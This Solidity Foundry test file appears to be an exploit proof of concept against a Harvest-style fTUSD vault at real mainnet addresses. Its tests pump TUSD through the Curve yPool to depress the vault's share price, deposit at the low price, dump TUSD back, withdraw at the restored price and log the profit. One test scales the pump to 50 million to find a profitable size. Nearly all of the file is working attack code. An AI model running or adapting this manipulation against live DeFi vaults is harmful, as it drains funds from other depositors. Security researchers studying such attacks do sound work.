// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface ICurveYPool {
    function exchange_underlying(int128 i, int128 j, uint256 dx, uint256 minDy) external;
    function balances(int128 i) external view returns (uint256);
}

interface IHVault {
    function deposit(uint256 amount) external;
    function withdraw(uint256 shares) external;
    function balanceOf(address) external view returns (uint256);
    function getPricePerFullShare() external view returns (uint256);
    function underlyingBalanceWithInvestment() external view returns (uint256);
}

contract TestFTUSD is Test {
    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant TUSD = 0x0000000000085d4780B73119b644AE5ecd22b376;
    address constant CURVE = 0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51;
    address constant FTUSD = 0x7674622c63Bee7F46E86a4A5A18976693D54441b;

    // Curve yPool indices: 0=DAI, 1=USDC, 2=USDT, 3=TUSD
    int128 constant IDX_USDC = 1;
    int128 constant IDX_TUSD = 3;

    function setUp() public {}

    /// @dev Test: verify pump/dump changes fTUSD share price
    function testPumpDumpEffect() public {
        uint256 ppfsBefore = IHVault(FTUSD).getPricePerFullShare();
        uint256 invBefore = IHVault(FTUSD).underlyingBalanceWithInvestment();
        emit log_named_uint("PPFS before", ppfsBefore);
        emit log_named_uint("InvestedBalance before", invBefore);

        // Give ourselves USDC for pump
        deal(USDC, address(this), 10_000_000e6);
        IERC20(USDC).approve(CURVE, type(uint256).max);

        // PUMP: USDC → TUSD (takes TUSD out of pool → TUSD scarcer → vault price drops)
        ICurveYPool(CURVE).exchange_underlying(IDX_USDC, IDX_TUSD, 10_000_000e6, 0);

        uint256 ppfsAfterPump = IHVault(FTUSD).getPricePerFullShare();
        uint256 invAfterPump = IHVault(FTUSD).underlyingBalanceWithInvestment();
        emit log_named_uint("PPFS after pump", ppfsAfterPump);
        emit log_named_uint("InvestedBalance after pump", invAfterPump);
        emit log_named_int("PPFS change (bps)", int256(ppfsAfterPump) - int256(ppfsBefore));

        // Now dump TUSD back → TUSD abundant → vault price restores
        uint256 tusdBal = IERC20(TUSD).balanceOf(address(this));
        IERC20(TUSD).approve(CURVE, type(uint256).max);
        ICurveYPool(CURVE).exchange_underlying(IDX_TUSD, IDX_USDC, tusdBal, 0);

        uint256 ppfsAfterDump = IHVault(FTUSD).getPricePerFullShare();
        emit log_named_uint("PPFS after dump", ppfsAfterDump);
    }

    /// @dev Test: single iteration pump-deposit-dump-withdraw profitability
    function testSingleIteration() public {
        // Fund with USDC (pump capital) and TUSD (dump buffer)
        deal(USDC, address(this), 10_000_000e6);
        deal(TUSD, address(this), 5_000_000e18);
        IERC20(USDC).approve(CURVE, type(uint256).max);
        IERC20(TUSD).approve(CURVE, type(uint256).max);
        IERC20(TUSD).approve(FTUSD, type(uint256).max);

        uint256 tusdBefore = IERC20(TUSD).balanceOf(address(this));
        uint256 usdcBefore = IERC20(USDC).balanceOf(address(this));

        // PUMP: buy TUSD with USDC → TUSD becomes scarce, vault price DROPS
        uint256 tusdBeforePump = IERC20(TUSD).balanceOf(address(this));
        ICurveYPool(CURVE).exchange_underlying(IDX_USDC, IDX_TUSD, 5_000_000e6, 0);
        uint256 pumpedTUSD = IERC20(TUSD).balanceOf(address(this)) - tusdBeforePump;
        emit log_named_uint("TUSD received from pump", pumpedTUSD);

        // DEPOSIT pumped TUSD at deflated price → get MORE shares
        uint256 ppfs = IHVault(FTUSD).getPricePerFullShare();
        emit log_named_uint("PPFS at deposit (low)", ppfs);
        IHVault(FTUSD).deposit(pumpedTUSD);
        uint256 shares = IHVault(FTUSD).balanceOf(address(this));
        emit log_named_uint("Shares received", shares);

        // DUMP: sell TUSD back to Curve → TUSD abundant, vault price RESTORES
        ICurveYPool(CURVE).exchange_underlying(IDX_TUSD, IDX_USDC, 5_000_000e18, 0);

        // WITHDRAW at restored price → get more TUSD per share
        ppfs = IHVault(FTUSD).getPricePerFullShare();
        emit log_named_uint("PPFS at withdraw (high)", ppfs);
        IHVault(FTUSD).withdraw(shares);

        uint256 tusdAfter = IERC20(TUSD).balanceOf(address(this));
        uint256 usdcAfter = IERC20(USDC).balanceOf(address(this));

        emit log_named_uint("TUSD before", tusdBefore);
        emit log_named_uint("TUSD after", tusdAfter);
        emit log_named_int("TUSD profit", int256(tusdAfter) - int256(tusdBefore));
        emit log_named_int("USDC change", int256(usdcAfter) - int256(usdcBefore));
    }

    /// @dev Test: does deposit() trigger investment into strategy?
    function testDepositInvests() public {
        uint256 investedBefore = IHVault(FTUSD).underlyingBalanceWithInvestment();
        uint256 inVaultBefore = _inVault();
        emit log_named_uint("Total before", investedBefore);
        emit log_named_uint("In vault before", inVaultBefore);

        // Deposit 1M TUSD
        deal(TUSD, address(this), 1_000_000e18);
        IERC20(TUSD).approve(FTUSD, type(uint256).max);
        IHVault(FTUSD).deposit(1_000_000e18);

        uint256 investedAfter = IHVault(FTUSD).underlyingBalanceWithInvestment();
        uint256 inVaultAfter = _inVault();
        emit log_named_uint("Total after", investedAfter);
        emit log_named_uint("In vault after", inVaultAfter);
        emit log_named_uint("In vault diff", inVaultAfter > inVaultBefore ? inVaultAfter - inVaultBefore : 0);

        // If inVault didn't change much, funds were invested into strategy!
        if (inVaultAfter <= inVaultBefore + 100e18) {
            emit log("DEPOSIT INVESTS INTO STRATEGY!");
        } else {
            emit log("Deposit stays in vault (no auto-invest)");
        }
    }

    function _inVault() internal view returns (uint256) {
        return IERC20(TUSD).balanceOf(FTUSD);
    }

    /// @dev Test: bigger pump to find profitable size
    function testLargerPump() public {
        deal(USDC, address(this), 50_000_000e6);
        deal(TUSD, address(this), 50_000_000e18);
        IERC20(USDC).approve(CURVE, type(uint256).max);
        IERC20(TUSD).approve(CURVE, type(uint256).max);
        IERC20(TUSD).approve(FTUSD, type(uint256).max);

        uint256 tusdBefore = IERC20(TUSD).balanceOf(address(this));

        // Try bigger pump: 50M USDC
        uint256 tusdPre = IERC20(TUSD).balanceOf(address(this));

        // PUMP: 50M USDC → TUSD
        ICurveYPool(CURVE).exchange_underlying(IDX_USDC, IDX_TUSD, 50_000_000e6, 0);
        uint256 pumpedTUSD = IERC20(TUSD).balanceOf(address(this)) - tusdPre;
        emit log_named_uint("TUSD from 50M pump", pumpedTUSD);

        uint256 ppfsLow = IHVault(FTUSD).getPricePerFullShare();
        emit log_named_uint("PPFS after pump (low)", ppfsLow);

        // DEPOSIT pumped TUSD
        IHVault(FTUSD).deposit(pumpedTUSD);
        uint256 shares = IHVault(FTUSD).balanceOf(address(this));
        emit log_named_uint("Shares received", shares);

        // DUMP: 50M TUSD → USDC (from self-fund)
        ICurveYPool(CURVE).exchange_underlying(IDX_TUSD, IDX_USDC, 50_000_000e18, 0);

        uint256 ppfsHigh = IHVault(FTUSD).getPricePerFullShare();
        emit log_named_uint("PPFS after dump (high)", ppfsHigh);

        // WITHDRAW
        IHVault(FTUSD).withdraw(shares);

        uint256 tusdAfter = IERC20(TUSD).balanceOf(address(this));
        uint256 usdcAfter = IERC20(USDC).balanceOf(address(this));
        emit log_named_int("TUSD profit", int256(tusdAfter) - int256(tusdBefore));
        emit log_named_int("USDC change", int256(usdcAfter) - int256(50_000_000e6));
    }
}
